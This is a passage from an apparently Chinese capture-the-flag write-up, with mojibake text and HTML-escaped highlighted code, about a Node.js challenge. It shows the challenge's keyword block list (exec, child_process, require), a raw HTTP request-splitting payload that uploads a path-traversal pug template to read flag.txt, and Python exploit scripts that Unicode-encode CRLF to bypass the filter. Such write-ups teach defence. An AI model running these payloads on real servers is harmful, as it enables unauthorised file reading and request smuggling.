&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;global&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;mainModule&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;require&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;\&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8081&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">port&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">server&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">address&lt;/span>&lt;span style="color:#111">().&lt;/span>&lt;span style="color:#75af00">port&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Example app listening at http://%s:%s&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">host&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">port&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ‰ä¸Šé¢ä¸¤ä¸ªé¢˜çš„é“ºå«ï¼Œè¿™ä¸ªä»£ç å°±ä¼šå¥½ç†è§£ä¸€äº›&lt;/p>
&lt;p>è¿™ä¸ªé¢˜æ”¹ç¼–çš„åœ°æ–¹åœ¨äºå¤šäº†ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œå¯ä»¥é€šè¿‡&lt;code>../&lt;/code>çš„mimetypeæ¥è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œpugæ¸²æŸ“ä¼šå€ŸåŠ©æˆ‘ä»¬ä¸Šä¼ çš„.pugæ¨¡æ¿ï¼Œåœ¨è¿™é‡ŒåŒ…å«flag.txt&lt;/p>
&lt;p>é€šè¿‡æŠ“åŒ…ä¿®æ”¹å†…å®¹æ¥åšpayload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Host: amiz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">Connection: keep-alive
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&lt;/span>&lt;span style="color:#75af00">POST&lt;/span> &lt;span style="color:#111">/file_upload&lt;/span> &lt;span style="color:#00a8c8">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">1.1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Host&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">amiz&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Length&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">266&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Content-Type&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Cache-control&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">no-cache&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Connection&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">keep-alive&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>------WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;amiz.pug&amp;#34;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Type: /../template
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>doctype html
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>html
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> head
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> style
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> include ../../../../../../../flag.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>------WebKitFormBoundary4RZFWBFQ4MBn61cf--
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GET /flag HTTP/1.1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host: amiz
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Connection: close
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>amiz:
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä½¿ç”¨ä¸Šé¢æˆ‘ä»¬å·²ç»æ„é€ å¥½çš„é€šç”¨exp.pyæ„é€ payload&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.utils&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://5214b607-8520-4572-9bfc-d289a0e0c4f8.node4.buuoj.cn:81/core?q=&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">SPACE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0120&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">CRLF&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u010d\u010a&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">SLASH&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u012f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DOUBLE_MARK&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0122&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">SINGLE_MARK&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">u&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\u0127&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">POST /file_upload HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Length: 266
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Cache-control: no-cache
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;amiz.pug&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: /../template
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">doctype html
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">html
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> head
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> style
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> include ../../../../../../../flag.txt
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf--
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">GET /flag HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: close
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">amiz: &amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39; &amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SPACE&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">CRLF&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SLASH&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">DOUBLE_MARK&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">SINGLE_MARK&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133327186.png" alt="image-20211206133327186">&lt;/p>
&lt;p>æˆåŠŸå¾—åˆ°flagï¼Œæœ¬åœ°æŠ“åŒ…çœ‹ä¸€ä¸‹å…·ä½“æƒ…å†µ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211207011253660.png" alt="image-20211207011253660">&lt;/p>
&lt;p>åœ¨expä¸­æˆ‘ä»¬å¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦åšäº†unicodeç¼–ç ï¼Œè¢«ç¼–ç çš„å­—ç¬¦åº”è¯¥åŒ…æ‹¬ä»¥ä¸‹è¿™äº›&lt;/p>
&lt;pre tabindex="0">&lt;code>! &amp;amp; ` ; + \ / &amp;#34; &amp;#39; &amp;lt;SPACE&amp;gt; &amp;lt;CRLF&amp;gt;
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133438315.png" alt="image-20211206133438315">&lt;/p>
&lt;p>ï¼ˆï¼ï¼ï¼æ³¨æ„ è¿™é‡Œå¾ˆå¯èƒ½æœ‰é—æ¼æˆ–è€…ä¸å¿…è¦çš„ è¯·æ ¹æ®å®é™…æƒ…å†µä¿®æ”¹&lt;/p>
&lt;p>ä¸‹é¢æ˜¯å®Œå…¨ç¼–ç çš„exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;amiz HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">POST /file_upload HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: amiz
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Length: 266
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Cache-control: no-cache
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;amiz.pug&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: ../template
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">doctype html
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">html
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> head
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> style
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200"> include ../../../../../../../flag.txt
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">------WebKitFormBoundary4RZFWBFQ4MBn61cf--
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0xff&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">))[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
